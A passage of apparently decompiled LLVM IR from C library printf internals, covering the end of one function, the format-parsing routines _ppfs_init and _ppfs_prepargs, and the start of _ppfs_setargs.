  %v1_12f9c = phi i32 [ %v0_12fd8.pr, %dec_label_pc_12fd4thread-pre-split ], [ %v2_12fcc, %dec_label_pc_12fc8 ]
  store i32 %v2_12e94, i32* @r6, align 4
  %v2_12fd8 = icmp eq i32 %v1_12f9c, 0
  store i32 %v2_12db0, i32* @r1, align 4
  store i32 %v2_12dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_12e94, i32* @r0, align 4
  br i1 %v2_12fd8, label %dec_label_pc_12fec, label %dec_label_pc_12f98

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fd4, %.thread36
  %v0_12fec = load i32, i32* @fp, align 4
  store i32 %v0_12fec, i32* %r0.global-to-local, align 4
  %v0_12ff4 = load i32, i32* @sl, align 4
  store i32 %v0_12ff4, i32* %r2.global-to-local, align 4
  %v4_12ff8 = call i32 @_charpad(i32 %v0_12fec, i8 32, i32 %v0_12ff4)
  store i32 %v4_12ff8, i32* %r0.global-to-local, align 4
  %v1_12ffc = load i32, i32* @sl, align 4
  %v9_12ffc = icmp eq i32 %v4_12ff8, %v1_12ffc
  br i1 %v9_12ffc, label %dec_label_pc_13004, label %dec_label_pc_13018

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fec, %dec_label_pc_12d74, %dec_label_pc_12b98
  %stack_var_-316.3 = phi i32 [ %v0_12bec, %dec_label_pc_12b98 ], [ %v0_12f10, %dec_label_pc_12fec ], [ %v0_12bec, %dec_label_pc_12d74 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_12b98 ], [ %v2_12efc, %dec_label_pc_12fec ], [ %v2_12d78, %dec_label_pc_12d74 ]
  %v3_13004 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_13004, i32* @r4, align 4
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_12aa8, %dec_label_pc_13004
  %v0_13008 = phi i32 [ %v0_13008.pre, %dec_label_pc_12aa8 ], [ %v3_13004, %dec_label_pc_13004 ]
  %v0_12bec = phi i32 [ %tmp100, %dec_label_pc_12aa8 ], [ %stack_var_-316.3, %dec_label_pc_13004 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_12aa8 ], [ %stack_var_-336.3, %dec_label_pc_13004 ]
  store i32 %v0_13008, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ac0.outer

dec_label_pc_12ac0.outer:                         ; preds = %dec_label_pc_13010, %dec_label_pc_13008
  %v5_12aec = phi i32 [ %v1_12b1c, %dec_label_pc_13010 ], [ %v0_13008, %dec_label_pc_13008 ]
  %v0_12ac049 = phi i32 [ %v1_13010, %dec_label_pc_13010 ], [ %v0_13008, %dec_label_pc_13008 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_13010 ], [ %stack_var_-336.4, %dec_label_pc_13008 ]
  %v1_12ac0180 = inttoptr i32 %v0_12ac049 to i8*
  %v2_12ac0181 = load i8, i8* %v1_12ac0180, align 1
  %v3_12ac0182 = zext i8 %v2_12ac0181 to i32
  store i32 %v3_12ac0182, i32* %r3.global-to-local, align 4
  %v2_12ac4183 = icmp eq i8 %v2_12ac0181, 0
  br i1 %v2_12ac4183, label %dec_label_pc_12adc, label %bb126

dec_label_pc_13010:                               ; preds = %dec_label_pc_12b1c
  %v1_13010 = add i32 %v0_12b24, 2
  store i32 %v1_13010, i32* @r4, align 4
  br label %dec_label_pc_12ac0.outer

dec_label_pc_13018:                               ; preds = %dec_label_pc_12e88, %dec_label_pc_12fec, %.thread36, %dec_label_pc_12f38, %dec_label_pc_12f1c, %dec_label_pc_12dec, %bb162, %dec_label_pc_12d50, %bb130, %dec_label_pc_12fc8
  br label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %dec_label_pc_12b10, %bb, %dec_label_pc_12a90, %dec_label_pc_13018
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_12a90 ], [ -1, %dec_label_pc_13018 ], [ %stack_var_-336.2, %dec_label_pc_12b10 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_12a4c, i32* @r5, align 4
  store i32 %v15_12a4c, i32* @r8, align 4
  store i32 %v18_12a4c, i32* @sb, align 4
  store i32 %v21_12a4c, i32* @sl, align 4
  store i32 %v24_12a4c, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_13010, { 1, 0 }
  uselistorder i8 %v2_12ac0181, { 1, 2, 0 }
  uselistorder i32 %v0_12ac049, { 2, 0, 1 }
  uselistorder i32 %v5_12aec, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12bec, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_13008, { 1, 0, 2 }
  uselistorder i32 %v1_12f9c, { 2, 1, 0 }
  uselistorder i32 %v0_12fa4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12f24, { 1, 0 }
  uselistorder i32 %v2_12f08, { 2, 0, 1 }
  uselistorder i1 %v3_12ee8, { 1, 0 }
  uselistorder i32 %v0_12ef8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12ecc, { 1, 0 }
  uselistorder i32 %v0_12f10, { 1, 0, 2 }
  uselistorder i32 %v3_12ea0, { 1, 2, 0 }
  uselistorder i32 %v0_12e50, { 1, 0 }
  uselistorder i32 %v2_12e34, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12dfc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12dc8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12ccc, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_12ce8, { 1, 2, 3, 0 }
  uselistorder i32 %v6_12c68, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_12bcc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12b7c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_12b74, { 1, 0 }
  uselistorder i32 %v1_12b1c, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_12adc, { 1, 0 }
  uselistorder i32 %v1_12ad4.lcssa, { 1, 0 }
  uselistorder i8 %v2_12ac0, { 1, 2, 0 }
  uselistorder i32 %v2_12ad4, { 1, 2, 3, 0 }
  uselistorder i1 %v7_12ce0, { 1, 0 }
  uselistorder i1 %v7_12c2c, { 1, 2, 0 }
  uselistorder i1 %v7_12e24, { 1, 0 }
  uselistorder i1 %v7_12d84, { 1, 0 }
  uselistorder i1 %v7_12c70, { 1, 0 }
  uselistorder i32 %v2_12dc4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12e94, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_12ba4, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_12b78, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_12b58, { 1, 2, 0 }
  uselistorder i32 %v4_12b50, { 1, 0 }
  uselistorder i32 %v2_12a54, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 2, 3, 0, 1, 4, 5, 39, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 10, 12, 11, 14, 13, 15, 16, 19, 17, 18, 21, 20, 23, 22, 25, 24, 27, 26, 31, 28, 29, 30, 1, 32, 33, 43, 34, 44, 45, 36, 35, 38, 37, 40, 39, 42, 41, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13020, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13018, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_13008, { 1, 0 }
  uselistorder label %dec_label_pc_12fc8, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_12f38, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_12ee4, { 1, 0 }
  uselistorder label %dec_label_pc_12ec8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12ec8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12ebc, { 1, 0 }
  uselistorder label %dec_label_pc_12eac, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_12e40, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_12c1c, { 1, 0 }
  uselistorder label %dec_label_pc_12c18, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b70, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_12b10, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_12adc, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_13040 = load i32, i32* @r4, align 4
  store i32 %v3_13040, i32* %stack_var_-12, align 4
  %v6_13040 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1304c = load i32, i32* @r1, align 4
  store i32 %v0_1304c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_13054 = bitcast i32* %arg1 to i8*
  %v3_13054 = call i32 @__GI_memset(i8* %v2_13054, i32 0)
  %v0_13058 = load i32, i32* @r4, align 4
  %v1_13058 = add i32 %v0_13058, 24
  %v2_13058 = inttoptr i32 %v1_13058 to i32*
  %v3_13058 = load i32, i32* %v2_13058, align 4
  %v1_1305c = add i32 %v3_13058, -1
  store i32 %v1_1305c, i32* %v2_13058, align 4
  %v0_13064 = load i32, i32* @r5, align 4
  %v1_13064 = load i32, i32* @r4, align 4
  %v2_13064 = inttoptr i32 %v1_13064 to i32*
  store i32 %v0_13064, i32* %v2_13064, align 4
  %v0_13068 = load i32, i32* @r4, align 4
  %v1_13068 = add i32 %v0_13068, 40
  store i32 %v1_13068, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1307819 = inttoptr i32 %v1_13068 to i32*
  store i32 8, i32* %v2_1307819, align 4
  %v3_1307820 = load i32, i32* %r1.global-to-local, align 4
  %v4_1307821 = add i32 %v3_1307820, 4
  store i32 %v4_1307821, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13070.dec_label_pc_13070_crit_edge

dec_label_pc_13070.dec_label_pc_13070_crit_edge:  ; preds = %entry, %dec_label_pc_13070.dec_label_pc_13070_crit_edge
  %v4_1307822 = phi i32 [ %v4_1307821, %entry ], [ %v4_13078, %dec_label_pc_13070.dec_label_pc_13070_crit_edge ]
  %v0_13074.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13074 = add i32 %v0_13074.pre, -1
  store i32 %v1_13074, i32* %r2.global-to-local, align 4
  %v7_13074 = icmp eq i32 %v0_13074.pre, 1
  %v2_13078 = inttoptr i32 %v4_1307822 to i32*
  store i32 8, i32* %v2_13078, align 4
  %v3_13078 = load i32, i32* %r1.global-to-local, align 4
  %v4_13078 = add i32 %v3_13078, 4
  store i32 %v4_13078, i32* %r1.global-to-local, align 4
  br i1 %v7_13074, label %dec_label_pc_13080, label %dec_label_pc_13070.dec_label_pc_13070_crit_edge

dec_label_pc_13080:                               ; preds = %dec_label_pc_13070.dec_label_pc_13070_crit_edge
  %v0_13080 = load i32, i32* @r5, align 4
  store i32 %v0_13080, i32* %r2.global-to-local, align 4
  %v1_130c43 = inttoptr i32 %v0_13080 to i8*
  %v2_130c44 = load i8, i8* %v1_130c43, align 1
  %v2_130c86 = icmp eq i8 %v2_130c44, 0
  br i1 %v2_130c86, label %dec_label_pc_130d0, label %dec_label_pc_13090

dec_label_pc_13088:                               ; preds = %dec_label_pc_130a8
  %v2_1308c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1308c, i32* @r4, align 4
  store i32 %v6_13040, i32* @r5, align 4
  ret i32 -1

dec_label_pc_13090:                               ; preds = %dec_label_pc_13080, %dec_label_pc_130c4.backedge
  %v0_13098 = phi i32 [ %storemerge, %dec_label_pc_130c4.backedge ], [ %v0_13080, %dec_label_pc_13080 ]
  %v2_130c47 = phi i8 [ %v2_130c4, %dec_label_pc_130c4.backedge ], [ %v2_130c44, %dec_label_pc_13080 ]
  %v7_13090 = icmp eq i8 %v2_130c47, 37
  br i1 %v7_13090, label %dec_label_pc_13098, label %dec_label_pc_130c0

dec_label_pc_13098:                               ; preds = %dec_label_pc_13090
  %v1_13098 = add i32 %v0_13098, 1
  %v2_13098 = inttoptr i32 %v1_13098 to i8*
  %v3_13098 = load i8, i8* %v2_13098, align 1
  store i32 %v1_13098, i32* %r2.global-to-local, align 4
  %v7_1309c = icmp eq i8 %v3_13098, 37
  br i1 %v7_1309c, label %dec_label_pc_130c0, label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_13098
  %v0_130a0 = load i32, i32* @r4, align 4
  %v2_130a8 = inttoptr i32 %v0_130a0 to i32*
  store i32 %v1_13098, i32* %v2_130a8, align 4
  %v2_130ac = call i32 @_ppfs_parsespec(i32* %v2_130a8)
  %v1_130b0 = icmp slt i32 %v2_130ac, 0
  br i1 %v1_130b0, label %dec_label_pc_13088, label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_130a8
  %v0_130b8 = load i32, i32* @r4, align 4
  %v1_130b8 = inttoptr i32 %v0_130b8 to i32*
  %v2_130b8 = load i32, i32* %v1_130b8, align 4
  br label %dec_label_pc_130c4.backedge

dec_label_pc_130c0:                               ; preds = %dec_label_pc_13090, %dec_label_pc_13098
  %v0_130c0 = phi i32 [ %v0_13098, %dec_label_pc_13090 ], [ %v1_13098, %dec_label_pc_13098 ]
  %v1_130c0 = add i32 %v0_130c0, 1
  br label %dec_label_pc_130c4.backedge

dec_label_pc_130c4.backedge:                      ; preds = %dec_label_pc_130c0, %dec_label_pc_130b8
  %storemerge = phi i32 [ %v1_130c0, %dec_label_pc_130c0 ], [ %v2_130b8, %dec_label_pc_130b8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_130c4 = inttoptr i32 %storemerge to i8*
  %v2_130c4 = load i8, i8* %v1_130c4, align 1
  %v2_130c8 = icmp eq i8 %v2_130c4, 0
  br i1 %v2_130c8, label %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge, label %dec_label_pc_13090

dec_label_pc_130c4.dec_label_pc_130d0_crit_edge:  ; preds = %dec_label_pc_130c4.backedge
  %v0_130d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_130d0

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge, %dec_label_pc_13080
  %v0_130d0 = phi i32 [ %v0_130d0.pre, %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge ], [ %v0_13080, %dec_label_pc_13080 ]
  %v3_130c4.lcssa.in = phi i8 [ %v2_130c4, %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge ], [ %v2_130c44, %dec_label_pc_13080 ]
  %v3_130c4.lcssa = zext i8 %v3_130c4.lcssa.in to i32
  %v1_130d0 = load i32, i32* @r4, align 4
  %v2_130d0 = inttoptr i32 %v1_130d0 to i32*
  store i32 %v0_130d0, i32* %v2_130d0, align 4
  %v2_130d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_130d4, i32* @r4, align 4
  store i32 %v6_13040, i32* @r5, align 4
  ret i32 %v3_130c4.lcssa

; uselistorder directives
  uselistorder i8 %v2_130c4, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13080, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13078, { 1, 0 }
  uselistorder i32 %v0_13074.pre, { 1, 0 }
  uselistorder i32 %v6_13040, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_130c0, { 1, 0 }
  uselistorder label %dec_label_pc_13090, { 1, 0 }
  uselistorder label %dec_label_pc_13070.dec_label_pc_13070_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_130d8 = load i32, i32* @r4, align 4
  store i32 %v3_130d8, i32* %stack_var_-12, align 4
  %v1_130dc = add i32 %arg1, 24
  %v2_130dc = inttoptr i32 %v1_130dc to i32*
  %v3_130dc = load i32, i32* %v2_130dc, align 4
  store i32 %v3_130dc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_130ec = add i32 %arg1, 76
  %v3_130ec = inttoptr i32 %v2_130ec to i32*
  store i32 %arg2, i32* %v3_130ec, align 4
  %v7_130f0 = icmp sgt i32 %v3_130dc, 0
  br i1 %v7_130f0, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_130f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_130f0, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_130f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_130f4 = add i32 %arg1, 8
  %v3_130f4 = inttoptr i32 %v2_130f4 to i32*
  store i32 %v0_130f4, i32* %v3_130f4, align 4
  %v0_130f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_130f8 = add i32 %arg1, 28
  %v3_130f8 = inttoptr i32 %v2_130f8 to i32*
  store i32 %v0_130f8, i32* %v3_130f8, align 4
  %v0_130fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_130fc, i32* %v2_130dc, align 4
  %v0_13100 = load i32, i32* %r3.global-to-local, align 4
  %v2_13100 = add i32 %arg1, 4
  %v3_13100 = inttoptr i32 %v2_13100 to i32*
  store i32 %v0_13100, i32* %v3_13100, align 4
  %v0_13104 = call i32 @_ppfs_setargs()
  %v0_13108 = load i32, i32* %r5.global-to-local, align 4
  %v1_13108 = load i32, i32* @r4, align 4
  %v2_13108 = add i32 %v1_13108, 24
  %v3_13108 = inttoptr i32 %v2_13108 to i32*
  store i32 %v0_13108, i32* %v3_13108, align 4
  %v2_1310c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1310c, i32* @r4, align 4
  ret i32 %v0_13104

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 3, 6, 2, 1, 5, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13110 = load i32, i32* @r0, align 4
  %v1_13110 = add i32 %v0_13110, 24
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* %r1.global-to-local, align 4
  %v2_13114 = icmp eq i32 %v3_13110, 0
  %v3_13118 = load i32, i32* @r4, align 4
  store i32 %v3_13118, i32* %stack_var_-8, align 4
  %v1_1311c = add i32 %v0_13110, 80
  store i32 %v1_1311c, i32* %ip.global-to-local, align 4
  %v1_13120 = add i32 %v0_13110, 8
  %v2_13120 = inttoptr i32 %v1_13120 to i32*
  %v3_13120 = load i32, i32* %v2_13120, align 4
  store i32 %v3_13120, i32* %r3.global-to-local, align 4
  %v6_13128 = icmp eq i32 %v3_13120, -2147483648
  br i1 %v2_13114, label %dec_label_pc_13128, label %dec_label_pc_1324c

dec_label_pc_13128:                               ; preds = %entry
  br i1 %v6_13128, label %dec_label_pc_13130, label %dec_label_pc_13148

dec_label_pc_13130:                               ; preds = %dec_label_pc_13128
  %v1_13130 = add i32 %v0_13110, 76
  %v2_13130 = inttoptr i32 %v1_13130 to i32*
  %v3_13130 = load i32, i32* %v2_13130, align 4
  store i32 %v3_13130, i32* %r3.global-to-local, align 4
  %v1_13134 = inttoptr i32 %v3_13130 to i32*
  %v2_13134 = load i32, i32* %v1_13134, align 4
  store i32 %v2_13134, i32* %r2.global-to-local, align 4
  %v1_13138 = add i32 %v3_13130, 4
  store i32 %v1_13138, i32* %r3.global-to-local, align 4
  store i32 %v1_13138, i32* %v2_13130, align 4
  %v0_13140 = load i32, i32* %r2.global-to-local, align 4
  %v1_13140 = load i32, i32* @r0, align 4
  %v2_13140 = add i32 %v1_13140, 8
  %v3_13140 = inttoptr i32 %v2_13140 to i32*
  store i32 %v0_13140, i32* %v3_13140, align 4
  %v0_13144 = load i32, i32* %r2.global-to-local, align 4
  %v1_13144 = load i32, i32* @r0, align 4
  %v2_13144 = add i32 %v1_13144, 80
  %v3_13144 = inttoptr i32 %v2_13144 to i32*
  store i32 %v0_13144, i32* %v3_13144, align 4
  %v0_13148.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13148

dec_label_pc_13148:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13130
  %v1_13160 = phi i32 [ %v0_13110, %dec_label_pc_13128 ], [ %v0_13148.pre, %dec_label_pc_13130 ]
  %v1_13148 = add i32 %v1_13160, 4
  %v2_13148 = inttoptr i32 %v1_13148 to i32*
  %v3_13148 = load i32, i32* %v2_13148, align 4
  store i32 %v3_13148, i32* %r3.global-to-local, align 4
  %v6_1314c = icmp eq i32 %v3_13148, -2147483648
  br i1 %v6_1314c, label %dec_label_pc_13154, label %dec_label_pc_1316c

dec_label_pc_13154:                               ; preds = %dec_label_pc_13148
  %v1_13154 = add i32 %v1_13160, 76
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  %v3_13154 = load i32, i32* %v2_13154, align 4
  store i32 %v3_13154, i32* %r3.global-to-local, align 4
  %v1_13158 = inttoptr i32 %v3_13154 to i32*
  %v2_13158 = load i32, i32* %v1_13158, align 4
  store i32 %v2_13158, i32* %r2.global-to-local, align 4
  %v1_1315c = add i32 %v3_13154, 4
  store i32 %v1_1315c, i32* %r3.global-to-local, align 4
  store i32 %v1_1315c, i32* %v2_13154, align 4
  %v0_13164 = load i32, i32* %r2.global-to-local, align 4
  %v1_13164 = load i32, i32* @r0, align 4
  %v2_13164 = add i32 %v1_13164, 4
  %v3_13164 = inttoptr i32 %v2_13164 to i32*
  store i32 %v0_13164, i32* %v3_13164, align 4
  %v0_13168 = load i32, i32* %r2.global-to-local, align 4
  %v1_13168 = load i32, i32* @r0, align 4
  %v2_13168 = add i32 %v1_13168, 80
  %v3_13168 = inttoptr i32 %v2_13168 to i32*
  store i32 %v0_13168, i32* %v3_13168, align 4
  %v0_1323c18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_13148, %dec_label_pc_13154
  %v0_1323c18 = phi i32 [ %v1_13160, %dec_label_pc_13148 ], [ %v0_1323c18.pre, %dec_label_pc_13154 ]
  %v0_1316c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1316c, i32* %lr.global-to-local, align 4
  %v1_1323c19 = add i32 %v0_1323c18, 28
  %v2_1323c20 = inttoptr i32 %v1_1323c19 to i32*
  %v3_1323c21 = load i32, i32* %v2_1323c20, align 4
  store i32 %v3_1323c21, i32* %r3.global-to-local, align 4
  %v5_1324423 = icmp slt i32 %v0_1316c, %v3_1323c21
  br i1 %v5_1324423, label %dec_label_pc_13174, label %dec_label_pc_13248.loopexit

dec_label_pc_13174:                               ; preds = %dec_label_pc_1316c, %dec_label_pc_13238
  %v0_1323c25 = phi i32 [ %v0_1323c, %dec_label_pc_13238 ], [ %v0_1323c18, %dec_label_pc_1316c ]
  %v1_1317424 = phi i32 [ %v1_13238, %dec_label_pc_13238 ], [ %v0_1316c, %dec_label_pc_1316c ]
  %v4_13174 = mul i32 %v1_1317424, 4
  %v5_13174 = add i32 %v0_1323c25, %v4_13174
  store i32 %v5_13174, i32* %r3.global-to-local, align 4
  %v1_13178 = add i32 %v5_13174, 40
  %v2_13178 = inttoptr i32 %v1_13178 to i32*
  %v3_13178 = load i32, i32* %v2_13178, align 4
  store i32 %v3_13178, i32* %r2.global-to-local, align 4
  %v7_1317c = icmp eq i32 %v3_13178, 8
  br i1 %v7_1317c, label %dec_label_pc_13238, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_13174
  %v1_13184 = add i32 %v0_1323c25, 76
  %v2_13184 = inttoptr i32 %v1_13184 to i32*
  %v3_13184 = load i32, i32* %v2_13184, align 4
  store i32 %v3_13184, i32* %r1.global-to-local, align 4
  %v8_13188 = icmp sgt i32 %v3_13178, 8
  br i1 %v8_13188, label %dec_label_pc_131ac, label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13184
  %v7_1318c = icmp eq i32 %v3_13178, 2
  br i1 %v7_1318c, label %dec_label_pc_131f8, label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %dec_label_pc_1318c
  %v8_13194 = icmp sgt i32 %v3_13178, 2
  br i1 %v8_13194, label %dec_label_pc_131a4, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_13194
  %v1_13198 = icmp slt i32 %v3_13178, 0
  br i1 %v1_13198, label %dec_label_pc_13224, label %dec_label_pc_131f8

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13194
  %v7_131a4 = icmp eq i32 %v3_13178, 7
  br i1 %v7_131a4, label %dec_label_pc_1320c, label %dec_label_pc_13224

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13184
  %v7_131ac = icmp eq i32 %v3_13178, 1024
  br i1 %v7_131ac, label %dec_label_pc_131f8, label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_131ac
  %v8_131b4 = icmp sgt i32 %v3_13178, 1024
  br i1 %v8_131b4, label %dec_label_pc_131cc, label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131b4
  switch i32 %v3_13178, label %dec_label_pc_13224 [
    i32 256, label %dec_label_pc_131f8
    i32 512, label %dec_label_pc_131f8
  ]

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131b4
  %v7_131cc = icmp eq i32 %v3_13178, 2048
  br i1 %v7_131cc, label %dec_label_pc_131e4, label %dec_label_pc_131dc

dec_label_pc_131dc:                               ; preds = %dec_label_pc_131cc
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_131d8 = icmp eq i32 %v3_13178, 2055
  br i1 %v9_131d8, label %dec_label_pc_1320c, label %dec_label_pc_13224

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131cc
  %v1_131e4 = add i32 %v3_13184, 8
  store i32 %v1_131e4, i32* %r3.global-to-local, align 4
  store i32 %v1_131e4, i32* %v2_13184, align 4
  %v0_131ec = load i32, i32* %r1.global-to-local, align 4
  %v1_131ec = inttoptr i32 %v0_131ec to i32*
  %v2_131ec = load i32, i32* %v1_131ec, align 4
  store i32 %v2_131ec, i32* %r3.global-to-local, align 4
  %v3_131ec = add i32 %v0_131ec, 4
  %v4_131ec = inttoptr i32 %v3_131ec to i32*
  %v5_131ec = load i32, i32* %v4_131ec, align 4
  store i32 %v5_131ec, i32* %r4.global-to-local, align 4
  %v0_131f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_131f0 = inttoptr i32 %v0_131f0 to i32*
  store i32 %v2_131ec, i32* %v1_131f0, align 4
  %v3_131f0 = add i32 %v0_131f0, 4
